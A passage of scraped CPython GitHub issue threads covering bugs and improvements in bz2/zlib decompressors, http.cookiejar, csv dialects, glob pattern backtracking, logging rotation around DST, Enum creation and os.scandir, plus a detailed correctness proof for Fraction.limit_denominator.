>>> d.needs_input, d.eof
(True, False)
>>> d.decompress(b"")   # Expecting: b'' if needs_input is to be believed
b'\x00\x10 0@\x00\x10 0@'
>>> d = zlib._ZlibDecompressor()
>>> d.decompress(zlib.compress(b"\x00")[:4], max_length=0)
b''
>>> d.needs_input
True
>>> d.decompress(b"")
b'\x00'

lzma.LZMADecompressor and compression.zstd.ZstdDecompressor get this right. Compare lzma on the same kind of input:

>>> import lzma
>>> d = lzma.LZMADecompressor()
>>> d.decompress(lzma.compress(b"\x00" * 21), max_length=2)
b'\x00\x00'
>>> d.needs_input
False

The cause is that both modules decide needs_input from the input buffer alone. In _bz2module.c the branch that handles "input exhausted" unconditionally stores 1: Modules/_bz2module.c lines 539-542. zlibmodule.c has the same branch for _ZlibDecompressor: Modules/zlibmodule.c lines 1646-1649. _lzmamodule.c checks whether the output buffer was also full before it decides, with a comment explaining why: Modules/_lzmamodule.c lines 1069-1082. Porting that check to the other two modules looks like the whole fix.

As a practical matter I don't see a way for this to lose data for a caller following the documented protocol: the stream's trailer has not been consumed yet in these states, so the caller still has input to feed and will get the buffered output then. It does make needs_input unreliable as a "no more buffered output" signal, which is what max_length users (including DecompressReader in compression/_common/_streams.py, which raises EOFError rather than call decompress(b'') when needs_input is true at end of file) rely on. So it is worth fixing, but it is not urgent.

Found by the Hypothesis tests in #159960, which record it as test_needs_input_means_drained under expectedFailure for the bz2 and zlib backends. The reproducers depend on where the compressor places block boundaries; the ones above are for zlib 1.3.2 and libbz2 1.0.8.

CPython versions tested on

CPython main (4e3d5ec)

Operating systems tested on

Linux

Linked PRs

  • gh-160696

thread.author: iamsaugatpandey
thread.html:
I reproduced this on main, for both BZ2Decompressor and zlib._ZlibDecompressor.

There's a second case in bz2 that the report doesn't cover: decompress_buf() checks for exhausted input before checking for a full output buffer. So even with no max_length, decompress() can return only the first 32 KiB of a block's output when the input runs out at that moment (feeding the stream one byte at a time hits it about once per block). lzma had the same problem and fixed it in bpo-21872 (GH-14048).

Fixing the zlib flag also showed that gzip._GzipReader relied on the old behaviour: on valid data it could raise EOFError when decompress(b"") returned nothing. I'm opening a PR that fixes both decompressors the way lzma does, and changes gzip to raise EOFError only when reading the file returns no data, as DecompressReader already does.

issues.title: CookieJar.add_cookie_header() is linear in the number of stored domains
issues.author: Kludex
issues.bodyHTML:
Feature or enhancement

CookieJar.add_cookie_header() gets slower with every stored domain, even when only one cookie matches the request:

import timeit, urllib.request
from http.cookiejar import CookieJar, Cookie

def cookie(name, domain):
    return Cookie(0, name, "v", None, False, domain, True, False, "/", True, False, None, True, None, None, {})

for n in (10, 100, 1000, 10000):
    jar = CookieJar()
    for i in range(n):
        jar.set_cookie(cookie(f"c{i}", f"site{i}.example"))
    req = urllib.request.Request("https://site0.example/")
    t = min(timeit.repeat(lambda: jar.add_cookie_header(req), number=200, repeat=3)) / 200
    print(f"{n:>6} domains: {t*1e6:8.1f} us")
    10 domains:     37.9 us
   100 domains:    320.8 us
  1000 domains:   3086.9 us
 10000 domains:  30450.6 us

Each call:

  1. Runs DefaultCookiePolicy.domain_return_ok() for every stored domain, and each call re-parses the request URL via eff_request_host().
  2. Runs clear_expired_cookies(), which iterates every stored cookie.

Possible improvements, in increasing size:

  1. Compute eff_request_host() once per request instead of once per domain.
  2. With DefaultCookiePolicy, look up only the domain keys that can match the request host (its dot-suffixes) instead of iterating all domains.
  3. Track the earliest expiry in set_cookie() and skip the sweep until it has passed.

HTTPX2 ships 2 and 3 as a CookieJar subclass, which passes test_http_cookiejar: pydantic/httpx2#1285

I'm happy to send a PR.

issues.title: copy.replace loses slot-backed CSV dialect options
issues.author: Boyeep
issues.bodyHTML:
Bug report

copy.replace() loses slot-backed attributes of csv.Dialect subclasses. This can silently change how CSV data is parsed, even when the delimiter was not replaced.

Reproduced with CPython 3.16.0a1. The same implementation is present on main at 31a7d99.

import copy
import csv

class SemicolonDialect(csv.excel):
    __slots__ = ('delimiter',)

    def __init__(self):
        self.delimiter = ';'
        super().__init__()

dialect = SemicolonDialect()
replacement = copy.replace(dialect, quoting=csv.QUOTE_ALL)

print(list(csv.reader(['alpha;beta'], dialect)))
print(list(csv.reader(['alpha;beta'], replacement)))

Actual output:

[['alpha', 'beta']]
[['alpha;beta']]

Expected: both readers produce [['alpha', 'beta']], since only the quoting setting was replaced.

Dialect.__replace__() copies only __dict__, losing attributes stored in slots. The replacement therefore lacks its delimiter, and csv.reader falls back to the default comma delimiter.

I have prepared a local fix and regression tests.

CPython versions tested on:

3.16

Operating systems tested on:

No response

issues.title: Document correctness of `Fraction.limit_denominator`
issues.author: mdickinson
issues.bodyHTML:
The correctness of the Fraction.limit_denominator method is not immediately obvious, and extracting a proof of correctness from freely available external sources is nontrivial: Wikipedia has statements without proofs at https://en.wikipedia.org/wiki/Simple_continued_fraction#Best_rational_approximations, and a typical elementary number theory book will have you wade through a whole chapter of theory on continued fractions to get to something useful. In spite of that, a targeted correctness proof for limit_denominator is straightforward, and doesn't require developing the whole theory of continued fractions (or even mentioning them).

For future maintainers of Fraction.limit_denominator, it would be useful to have the correctness proof recorded somewhere: when I had to update the limit_denominator code in #93730, I had to stare at the code for a good hour to figure out why it worked at all, despite the fact that I wrote that code in the first place (albeit a good number of years ago). Moreover, the new tie-break condition, while more efficient than the old one, is also less obvious.

I'm not sure what the best place to record the proof is: the fractions.py source? A text file alongside the source? For now, I'll record the proof in this issue, which is at least better than nothing.

Note on originality: the proof below is my own, and not a transcription from another source. I haven't seen any proof along these lines in the literature, but this is an extremely well-traveled road, so it's very likely that there's something closely resembling it somewhere.

Proof of correctness of the limit_denominator algorithm

The problem being solved

The limit_denominator algorithm takes a fraction $m/n$ and a positive integer $\ell$, and aims to return a "best" approximation to $m/n$ from amongst all fractions $r/s$ with denominator bounded by $\ell$. To make "best" precise, let's establish some conventions and terminology:

  • All fractions are assumed to be in lowest terms, with positive denominator.
  • A candidate approximation to $m / n$ with denominator bounded by $\ell$ (or just candidate for short) is a fraction $r/s$ with $s \le \ell$.
  • Given two candidates $r/s$ and $t/u$, say that $r/s$ is better than $t/u$ if either
    • $r/s$ is closer to $m/n$ than $t/u$ is, or
    • $r/s$ and $t/u$ are equidistant from $m/n$, and $s \le u$.
  • A candidate $r/s$ is a best approximation if it's better than all (other) candidates.

The goal of this exposition is to convince the reader that Python's implementation of limit_denominator always returns a best approximation for the given inputs.

Some notes:

  • There's a tension with the English language: our "better" relation is reflexive (a candidate $r/s$ is better than itself), while the word "better" suggests an irreflexive relation. But other more accurate wordings ("no worse than", "better or equally good", "at least as good") are more cumbersome, so we'll live with the tension.
  • We'll show below that outside one corner case, there's a unique best approximation for a given set of arguments. That corner case is the case where $m/n$ is exactly halfway between two consecutive integers and $\ell = 1$; we'll call this the ambiguous case, and we'll return to it below.
  • For an example of the tie-break condition for "better", consider the case where $m/n = 99/140 = 0.707142...$ and $\ell = 10$. Then $7/10 = 0.7$ and $5/7 = 0.714285...$ are candidate approximations, they're equidistant from the target fraction $99/140$, and they're each closer than any other candidate - any fraction that's closer must be strictly between $7/10$ and $5/7$, and all fractions in the open interval $(7/10, 5/7)$ have denominator larger than $10$. Since $5/7$ has smaller denominator than $7/10$, our definition says that $5/7$ is better than $7/10$ (but not vice versa). So $5/7$ is the unique best approximation.

Simplifying the code

Here's the standard library implementation of Fraction.limit_denominator, shorn of
comments and docstring details, but otherwise unaltered.

class Fraction(numbers.Rational):

    # other methods elided ...

    def limit_denominator(self, max_denominator=1000000):
        """Closest Fraction to self with denominator at most max_denominator."""
        if max_denominator < 1:
            raise ValueError("max_denominator should be at least 1")
        if self._denominator <= max_denominator:
            return Fraction(self)

        p0, q0, p1, q1 = 0, 1, 1, 0
        n, d = self._numerator, self._denominator
        while True:
            a = n//d
            q2 = q0+a*q1
            if q2 > max_denominator:
                break
            p0, q0, p1, q1 = p1, q1, p0+a*p1, q2
            n, d = d, n-a*d
        k = (max_denominator-q0)//q1

        if 2*d*(q0+k*q1) <= self._denominator:
            return Fraction._from_coprime_ints(p1, q1)
        else:
            return Fraction._from_coprime_ints(p0+k*p1, q0+k*q1)

Instead of proving correctness of the above code directly, we'll prove correctness
of an equivalent simplified version. Here's that version:

def limit_denominator(m: int, n: int, l: int) -> tuple[int, int]:
    """
    Given a fraction m/n and a positive integer l, return integers r and s such
    that r/s is the closest fraction to m/n with denominator bounded by l.

    m/n need not be in lowest terms, but n must be positive.

    On return, 0 < s <= l and gcd(r, s) = 1.
    """
    if l < 1:
        raise ValueError("max_denominator should be at least 1")

    a, b, p, q, r, s, v = n, m % n, 1, 0, m // n, 1, 1
    while 0 < b and q + a // b * s <= l:
        a, b, p, q, r, s, v = b, a % b, r, s, p + a // b * r, q + a // b * s, -v
    k = (l - q) // s
    t, u = p + k * r, q + k * s
    return (r, s) if 2 * b * u <= n else (t, u)

The differences with the standard library version are mostly cosmetic: there are some de-optimizations (like computing a//b several times); we deal purely with integers to avoid the Fraction unpacking and repacking; some variables are renamed, and we've removed the fast path where a Fraction is returned unaltered if its denominator is already at most l. The most significant difference is that we've unrolled the first loop-and-a-half of the while loop, with the side-effect of shifting the break condition to the top of the loop, where it becomes the loop guard. There's also an extra variable v, which alternates between values 1 and -1. It's not needed for computing the final result, but we'll be making use of it in the statements and proofs below. Finally, the standard library code has no positivity check in the break condition to match the 0 < b check in the loop guard - that check proves to be unnecessary if the fast path is present.

Proof overview

The main loop of limit_denominator is a variant of the extended Euclidean algorithm applied to $m$ and $n$, with an extra termination condition designed to make sure that denominators don't go out of bounds - the moment a full Euclidean step would give us a denominator larger than $\ell$, we halt the loop. After the loop we take a partial Euclidean step, advancing exactly as far as possible without violating the denominator bound.

The main loop, together with that partial Euclidean step, produces candidate approximations $r/s$ and $t/u$ which bracket the target fraction $m/n$, and whose denominators are no greater than the limit $\ell$. With just two additional pieces of information, namely that $ts - ru = ±1$ and that $\ell < s + u$, we can deduce that all fractions strictly between $r/s$ and $t/u$ have denominator greater than $\ell$, hence that either $r/s$ or $t/u$ is a best approximation. The final line of the code then determines which of these two fractions is better and returns it.

In more detail, we'll show in the sections below that after exiting the while loop and defining $t$ and $u$, the following five properties hold:

  • $(ts - ru)v = 1$
  • $0 < s \le \ell$
  • $0 < u \le \ell$
  • $\ell < s + u$
  • $r/s \le m/n < t/u$ if $v=1$, and $t/u < m/n \le r/s$ if $v = -1$

Note that the first three properties make $r/s$ and $t/u$ well-defined as fractions, and moreover both are candidates: reduced, with a positive denominator bounded by $\ell$. We now show that the five properties imply that any fraction $y/z$ strictly between $r/s$ and $t/u$ has $z > \ell$. We have:

$$z = (ts - ru)vz = (tz - yu)vs + (ys - rz)vu.$$

Now $v$ is either $1$ or $-1$. If $v = 1$ then $r/s < t/u$, so $r/s < y/z < t/u$. So $ys - rz$ and $tz - yu$ are positive, hence $(ys - rz)v$ and $(tz - yu)v$ are positive integers. Conversely if $v = -1$ then $t/u < r/s$, so $t/u < y/z < r/s$ and $ys - rz$ and $tz - yu$ are negative. So again $(ys - rz)v$ and $(tz - yu)v$ are positive integers. So in either case, $(tz - yu)v \ge 1$ and $(ys - rz)v \ge 1$, hence
$$z = [(tz-yu)v]s + [(ys - rz)v]u \ge s + u > \ell.$$

At this point $r/s$ and $t/u$ are candidates, there are no candidates strictly between $r/s$ and $t/u$, while $m/n$ does lie between $r/s$ and $t/u$ (and may be equal to $r/s$, but not to $t/u$). It follows that $r/s$ and $t/u$ are the only possible best approximations to $m/n$, and that either $r/s$ or $t/u$ (or possibly both) is a best approximation. The code need only determine which of $r/s$ and $t/u$ is better than the other. The details are given in the "Choosing the best approximation" section below, while the proofs of the five properties that we used above are in the "Details" sections below.

Details: loop invariants

Both the initial state and the state after every iteration of the while loop satisfy the following six invariants:

  • $(ps - rq)v = 1$
  • $(pn - mq)v = a$
  • $(ms - rn)v = b$
  • $0 \le b < a$
  • $0 \le q$
  • $0 < s \le \ell$

These are all easily proved by induction: they hold for the initial state by inspection, and it's easy to see that the way that the variables are updated within the while loop keeps all of these properties invariant. Note that at the end of an iteration of the while loop, the condition $s \le \ell$ is exactly the condition that the loop was entered (that $q + \lfloor a / b \rfloor s \le \ell$).

That $v$ is either $1$ or $-1$ follows from the first invariant.

Details: loop termination

For a complete proof of correctness we need to establish that our while loop does not run indefinitely - it must terminate after a finite number of iterations. But this follows immediately from the observation that the value of $a$ remains positive and that it strictly decreases at every iteration: at each iteration the new value of $a$ is the old value of $b$, which from our loop invariant $b < a$ is smaller than the old value of $a$.

Details: after the loop

Here we prove that the five properties mentioned earlier hold.

One of our two possible return values, $r/s$, comes directly from the loop. We construct the second candidate $t/u$ after the loop: $t = p + kr$ and $u = q + ks$, with $k = \lfloor (\ell - q) / s \rfloor$. Think of $t/u$ as the result of taking a partial Euclidean step, as a replacement for the full Euclidean step which would have taken the denominator out of bounds.

That $0 < s \le \ell$ follows directly from the loop invariants. From the definition of $k$ we have $ks \le \ell - q < s + ks$, hence $ks + q \le \ell < s + ks + q$, that is
$$u \le \ell < s + u.$$
That $u$ is positive follows from $s \le \ell < s + u$. So $t/u$ is also a valid candidate approximation.

From construction of $t$ and $u$ and the relation $(ps - rq)v = 1$ we get an analogous relation for $r/s$ and $t/u$:
$$(ts - ru)v = 1.$$

We also define an integer $c = a - kb$, the result of taking the partial Euclidean step that gives $t$ and $u$. It's immediate from the definitions and the earlier loop invariants that:
$$(tn - mu)v = c$$
and
$$bt + cr = m$$
and finally,
$$bu + cs = n.$$

We next prove that $b \le c$. The intuition here is that a full Euclidean step would have given us the nonnegative remainder $a \bmod b$; since we took only a partial step instead, our remainder $c = a - kb$ is the full remainder $a \bmod b$ plus at least one copy of $b$. Concretely, there are two cases. If $0 < b$ then from the failed loop guard $\ell < q + \lfloor a /b \rfloor s$. But $q + ks = u \le \ell$, so $k < \lfloor a/b \rfloor$, from which $c = a - kb \ge a - b\lfloor a/b \rfloor + b \ge b$. Otherwise $b = 0$ and $c = a - kb = a$, and the result is immediate from the positivity of $a$.

Finally, note that $0 < c$. If $0 < b$ this follows from $b \le c$. If $b = 0$ it follows from the positivity of $a$ together with $c = a - kb = a$.

We've now established four of the five properties that were used in the proof overview above. The only property that we're missing is that $m/n$ lies between $r/s$ and $t/u$ (and can be equal to $r/s$, but not to $t/u$). But this follows from the facts that $0 \le b = (ms - rn)v$ and that $0 < c = (tn - mu)v$: if $v = 1$ then these give $r/s \le m/n < t/u$, while if $v = -1$ then $t/u < m/n \le r/s$.

Choosing the best approximation

By the time we get to the final line of limit_denominator, we know that either $r/s$ or $t/u$ is our best approximation; we need to choose the one that's closer to $m/n$. So we want to compare $|m/n - r/s|$ with $|t/u - m/n|$. Scaling up by $nsu$, we need to compare $|(ms - rn)u|$ with $|(tn - mu)s|$. Since $v$ is either plus or minus one, we can insert a factor of $v$ without affecting the absolute value, so we're now comparing $|(ms-rn)vu|$ with $|(tn - mu)vs|$. But from above, $(ms-rn)v = b$ is nonnegative, as is $(tn - mu)v = c$. So the comparison we want to make is
$$bu \le cs.$$
Adding $bu$ to both sides and using the fact that $bu + cs = n$, this is equivalent to the check
$$2bu \le n,$$
which is the check that we use in the code.

In the case that $r/s$ and $t/u$ are equidistant from $m/n$, we have $bu = cs$ (or equivalently $2bu = n$), and $r/s$ is returned. Since $b \le c$ and $c$ is positive, we must have $s = (b/c) u \le u$, so in this case $r/s$ is better than $t/u$ by the tie-break condition, so $r/s$ is a best approximation.

Uniqueness, and the ambiguous case

From earlier, any best approximation must be either $r/s$ or $t/u$, and at least one of these is a best approximation. Outside one corner case exactly one of these is a best approximation, so there's a unique best approximation to $m/n$ with denominator bounded by $\ell$, and limit_denominator returns that best approximation. In this section we explore the corner case where both $r/s$ and $t/u$ are best approximations, and we describe what limit_denominator returns in that situation.

So suppose that both $r/s$ and $t/u$ are best approximations. Then each is better than the other, so from the definition of better (including the tie-break condition) they must be equidistant from $m/n$, and we must also have $s \le u$ and $u \le s$, hence $s = u$. From $(ts - ru)v = 1$ and $s = u$ we have $s = u = 1$, so $t = r \pm 1$ and the candidates $r/s$ and $t/u$ are consecutive integers (in some order). Since $m/n$ is equidistant from both, it's a half-integer - a value of the form $w + 1/2$ for some integer $w$. Moreover, since $\ell < s + u$ and $\ell$ is positive, we must have $\ell = 1$.

Conversely, if $m / n$ is a half-integer and $\ell = 1$ then our candidates (denominator bounded by $1$) are simply integers, so it's clear that there are exactly two best approximations to $m / n$, namely
the floor and ceiling of $m / n$.

We call the case where $m / n$ is a half-integer and $\ell = 1$ the ambiguous case. The above argument shows that uniqueness fails precisely in the ambiguous case: if $\ell > 1$ or $m / n$ is not a half-integer, then there's a unique best approximation to $m / n$ with denominator bounded by $\ell$.

We now prove that in the ambiguous case, the limit_denominator algorithm returns the floor of $m / n$ rather than the ceiling. So suppose again that both $r/s$ and $t/u$ are best approximations. They are then equidistant from $m/n$, so as shown in the previous section $2bu = n$ and limit_denominator returns $r/s$. We need to show that $r/s$ is the lower of the two candidates; that is, that $r/s < t/u$, or equivalently that $v = 1$.

We first claim that $q = 0$. From the loop invariants it follows that
$$as + bq = (pn - mq)vs + (ms - rn)vq = (ps - rq)vn = n$$
so we have
$$as + bq = 2bu.$$
Subtracting $bs$ from both sides and rearranging gives
$$(a - b)s = b(2u - q - s).$$
But $b < a$ and $0 < s$ from the loop invariants, so the left-hand side is positive. Since $b$ is nonnegative, $2u - q - s$ must also be positive. As before, we also know that in this ambiguous case $s = u = 1$. So $2u - q - s = 1 - q$ and $1 - q$ is positive, so since $q$ is nonnegative, $q = 0$ is the only possibility. Looking back at the loop, $q$ is nonzero after every iteration of the loop body: the only time it's zero is when the loop hasn't run. And in that initial loop state we do indeed have $v = 1$, which is what we needed.

Optimizations: removing the $0 < b$ check and avoiding unnecessary gcds

The standard library version of the code has a fast path: if the denominator of the target fraction is already bounded by $\ell$, the code simply returns (a copy of) the target fraction immediately - a moment's thought should convince the reader that $m/n$ is the unique best approximation in this situation.

With the fast path in place, we can simplify the loop guard. Suppose that when the loop guard is evaluated, the $0 < b$ part of the condition is false. We claim that in that case, $n$ is at most $\ell$. For if $0 < b$ is false, then $b = 0$ (we know that $b$ is always nonnegative), the loop exits immediately, we construct $t/u$ as before, and the post-loop equations $bt + cr = m$ and $bu + cs = n$ give $cr = m$ and $cs = n$. So $c$ is a common factor of $m$ and $n$. But since $m$ and $n$ are relatively prime and $c$ is positive, $c = 1$, $m = r$ and $n = s$. But $s \le \ell$, so $n \le \ell$.

So if we've already excluded the case that $n \le \ell$ via the fast path, then the $0 < b$ condition at the top of the loop is always true, and we can drop it. The standard library version of the code does exactly that.

It's worth noting that the simplified listing does require the extra $0 < b$ check, for two reasons. First, the simplified listing does not require that its inputs $m$ and $n$ be relatively prime (though it does require that $n$ is positive). Second, it lacks the fast path. Removing the $0 < b$ check would require both adding a fast path and requiring that $m$ and $n$ be relatively prime.

One other optimization in the standard library version: since we already know that $r/s$ and $t/u$ are in lowest terms, we have no need to construct the returned Fraction through the default Fraction constructor, which would require a potentially expensive gcd computation. We can use the Fraction._from_coprime_ints constructor instead.

issues.title: pathlib match, full_match and glob take exponential time on short patterns because glob.translate skips fnmatch's atomic-group rewrite
issues.author: digit50
issues.bodyHTML:
Bug report

PurePath.match, PurePath.full_match and Path.glob take exponential time on short patterns with several *, because glob.translate() does not apply the atomic-group rewrite that fnmatch uses to prevent catastrophic backtracking (gh-84660). glob.translate() keeps only the parts list from fnmatch._translate() and discards the star indices, so every * becomes a plain backtracking [^/]*. fnmatch.fnmatchcase and glob.glob (which goes through fnmatch.filter) are fast on the same inputs.

import fnmatch, glob, os, tempfile, time
from pathlib import Path, PurePosixPath

pat = '*a' * 8 + '*b'          # 18 characters
print('translate:', glob.translate(pat))

def t(f):
    s = time.perf_counter(); f(); return f'{time.perf_counter() - s:.4f} s'

for n in (28, 36, 44, 52):
    name = 'a' * n
    print(n, "full_match", t(lambda: PurePosixPath(name).full_match(pat)),
          '| match', t(lambda: PurePosixPath(name).match(pat)),
          '| fnmatchcase', t(lambda: fnmatch.fnmatchcase(name, pat)))

with tempfile.TemporaryDirectory() as d:
    open(os.path.join(d, 'a' * 44), 'w').close()
    print('Path.glob  ', t(lambda: list(Path(d).glob(pat))))
    print('glob.glob  ', t(lambda: glob.glob(pat, root_dir=d)))

Python 3.14.8 (3.15.0 gives the same figures within noise):

translate: (?s:(?!\.)[^/]*a[^/]*a[^/]*a[^/]*a[^/]*a[^/]*a[^/]*a[^/]*a[^/]*b)\z
28 full_match 0.0399 s | match 0.0320 s | fnmatchcase 0.0001 s
36 full_match 0.2907 s | match 0.2899 s | fnmatchcase 0.0000 s
44 full_match 1.6570 s | match 1.6754 s | fnmatchcase 0.0000 s
52 full_match 7.1611 s | match 7.1651 s | fnmatchcase 0.0000 s
Path.glob   1.6258 s
glob.glob   0.0000 s

The time grows roughly as the binomial of the name length over the number of stars, so a few more characters in the name or one more *a in the pattern push it to minutes, holding the GIL for the whole duration.

First affected release is 3.13.0, where glob.translate() was added (gh-72904) and pathlib started matching through it. 3.11 PurePath.match is not affected.

Cause, at the default branch: Lib/glob.py in translate():

results.extend(fnmatch._translate(part, f'{not_sep}*', not_sep)[0])

Index [0] keeps the parts and drops star_indices, so the (?>.*?...) atomic grouping in fnmatch._join_translated_parts() never applies. _compile_pattern in Lib/glob.py compiles the result for _StringGlobber, which pathlib builds in full_match, match and glob. The gh-84660 regression test test_slow_fnmatch in Lib/test/test_fnmatch.py has no glob or pathlib counterpart.

Suggested fix: build each segment in glob.translate() from both the parts and the star indices returned by fnmatch._translate(), the way fnmatch._join_translated_parts() does, wrapping every interior STAR fixed pair in an atomic group with the separator-excluding star, so that segment matching cannot backtrack. Add glob and pathlib counterparts of test_slow_fnmatch with the pattern above. I can open a PR for this if useful.

issues.title: `TimedRotatingFileHandler` misnames backups around DST changes
issues.author: lpyu001
issues.bodyHTML:
Bug report

Summary

With local time (utc=False), TimedRotatingFileHandler can give a backup the wrong date or hour when a daylight saving time (DST) change is involved. For fixed-duration rollovers such as when='H' and when='D', the affected interval spans the change. For when='midnight', a record logged well after the scheduled rollover can also cause the wrong name. If the computed name already exists, the handler skips that rotation, advances the next rollover time, and later resumes rotating. Records from separate intervals can then end up in the same backup.

Reproduction Code

Unix only (time.tzset() and the America/New_York timezone are required).

Hourly rollover across the start of DST:

import logging, logging.handlers, os, tempfile, time
from unittest import mock

os.environ["TZ"] = "America/New_York"
time.tzset()

d = tempfile.mkdtemp()
fn = os.path.join(d, "app.log")
start = time.mktime((2026, 3, 7, 23, 0, 0, 0, 0, -1))
now = [start]
with mock.patch("time.time", lambda: now[0]):
    h = logging.handlers.TimedRotatingFileHandler(fn, when="H", delay=True)
    for i in range(6):
        now[0] = start + i * 3600
        msg = time.strftime("%H:%M%Z", time.localtime(now[0]))
        h.emit(logging.makeLogRecord({"msg": msg}))
h.close()
for name in sorted(os.listdir(d)):
    with open(os.path.join(d, name)) as f:
        print(name, f.read().split())

Midnight rollover when the first record on the day DST ends arrives after the change:

import logging, logging.handlers, os, tempfile, time
from unittest import mock

os.environ["TZ"] = "America/New_York"
time.tzset()

d = tempfile.mkdtemp()
fn = os.path.join(d, "app.log")
ts = lambda *args: time.mktime(args + (0, 0, -1))
now = [ts(2026, 10, 30, 8, 0, 0)]
with mock.patch("time.time", lambda: now[0]):
    h = logging.handlers.TimedRotatingFileHandler(fn, when="midnight", delay=True)
    for day in [(2026, 10, 30), (2026, 10, 31), (2026, 11, 1),
                (2026, 11, 2), (2026, 11, 3)]:
        for hour in (9, 18):
            now[0] = ts(*day, hour, 0, 0)
            msg = time.strftime("%m-%d_%H:%M%Z", time.localtime(now[0]))
            h.emit(logging.makeLogRecord({"msg": msg}))
h.close()
for name in sorted(os.listdir(d)):
    with open(os.path.join(d, name)) as f:
        print(name, f.read().split())

Sparse records with a 23:30 daily rollover:

import datetime, logging, logging.handlers, os, tempfile, time
from unittest import mock

os.environ["TZ"] = "America/New_York"
time.tzset()

d = tempfile.mkdtemp()
fn = os.path.join(d, "app.log")
ts = lambda *args: time.mktime(args + (0, 0, -1))
now = [ts(2026, 3, 1, 12, 0, 0)]
with mock.patch("time.time", lambda: now[0]):
    h = logging.handlers.TimedRotatingFileHandler(
        fn, when="midnight", atTime=datetime.time(23, 30), delay=True)
    for args in [(2026, 3, 1, 12, 0, 0), (2026, 4, 1, 12, 0, 0),
                 (2026, 10, 1, 12, 0, 0), (2026, 12, 1, 12, 0, 0)]:
        now[0] = ts(*args)
        msg = time.strftime("%m-%d_%H:%M%Z", time.localtime(now[0]))
        h.emit(logging.makeLogRecord({"msg": msg}))
h.close()
for name in sorted(os.listdir(d)):
    with open(os.path.join(d, name)) as f:
        print(name, f.read().split())

Actual Behavior

Hourly rollover saves the 01:00EST interval as _03. The next interval also maps to _03, so that rotation is skipped. Rotation resumes later, with 03:00EDT and 04:00EDT together in _04:

app.log ['05:00EDT']
app.log.2026-03-07_23 ['23:00EST']
app.log.2026-03-08_00 ['00:00EST']
app.log.2026-03-08_03 ['01:00EST']
app.log.2026-03-08_04 ['03:00EDT', '04:00EDT']

Midnight rollover skips the rotation on November 1 because it computes the already used October 30 name for the October 31 interval. The next rotation puts October 31 and November 1 in _11-01:

app.log ['11-03_09:00EST', '11-03_18:00EST']
app.log.2026-10-30 ['10-30_09:00EDT', '10-30_18:00EDT']
app.log.2026-11-01 ['10-31_09:00EDT', '10-31_18:00EDT', '11-01_09:00EST', '11-01_18:00EST']
app.log.2026-11-02 ['11-02_09:00EST', '11-02_18:00EST']

With sparse records and atTime, the March 1 record is saved under March 1 rather than February 28:

app.log ['12-01_12:00EST']
app.log.2026-03-01 ['03-01_12:00EST']
app.log.2026-03-31 ['04-01_12:00EDT']
app.log.2026-09-30 ['10-01_12:00EDT']

Expected Behavior

The doRollover() docstring says a backup is named for the start of its interval. In the hourly example, the 01:00EST record should be in _01, followed by separate _03 and _04 backups. In the midnight example, each day from October 30 through November 2 should have its own backup. In the sparse atTime example, the first backup should be dated February 28.

Root Cause

doRollover() starts with t = self.rolloverAt - self.interval, then compares the DST state of t with that of the record that triggered rotation. When they differ, it shifts the time used for the filename by one hour. This adjustment runs for every when value. For fixed-duration rollovers, t is already the interval start, so the shift can misname it. For midnight and weekly rollovers, the triggering record can arrive long after rolloverAt; its DST state need not match the DST state at the scheduled boundary.

issues.title: Enum creation is quadratic in the number of members (`_hashable_values_` list scan)
issues.author: jonbaldie
issues.bodyHTML:
Bug report

Bug description:

Creating an Enum is quadratic in the number of members again. When each member is added, _proto_member.__set_name__ runs value not in enum_class._hashable_values_, and _hashable_values_ is a list, so every new member scans all the ones before it.

import time
from enum import Enum

for n in (1000, 4000, 8000, 16000):
    members = {f'M{i:08x}': i for i in range(n)}
    t = time.perf_counter()
    Enum('Generated', members)
    print(n, f'{(time.perf_counter() - t) * 1e3:.0f} ms')

On main (3.16 dev, macOS arm64): 5.8 / 54 / 187 / 713 ms. Each doubling of n costs about 4x.

This is the same symptom as gh-89580, which was fixed. The _hashable_values_ scan came in later.

The scan is only needed when the value was already in _value2member_map_ before this member was added, for example an alias or a Flag pseudo-member that the class cached earlier. If setdefault just added the key, the value can't be in the list yet.

issues.title: Make `os.scandir` retry on system calls failing with EINTR
issues.author: gsnedders
issues.bodyHTML:
Bug report

Bug description:

In a long-running script, I hit:

[…]
  File "/Users/gsnedders/ct.py", line 104, in worker
    with os.scandir(path) as it:
         ~~~~~~~~~~^^^^^^
InterruptedError: [Errno 4] Interrupted system call: '/Users/gsnedders/Library/Containers/com.apple.ScreenTimeWidgetApplication.ScreenTimeWidgetExtension/Data/Library/Application Scripts'

No repro case is provided, because that would require making syscalls fail with EINTR reliably somehow.

PEP 475 (Retry system calls failing with EINTR) implies to me that os.scandir should be retrying, rather than just failing here.

It does appear that os.scandir doesn't always retry, looking at the source:

cpython/Modules/posixmodule.c

Line 16489 in ae30646

iterator->dirp = fdopendir(fd);

The iterator itself also seems to not retry:

cpython/Modules/posixmodule.c

Line 16290 in ae30646

direntp = readdir(iterator->dirp);

3.13
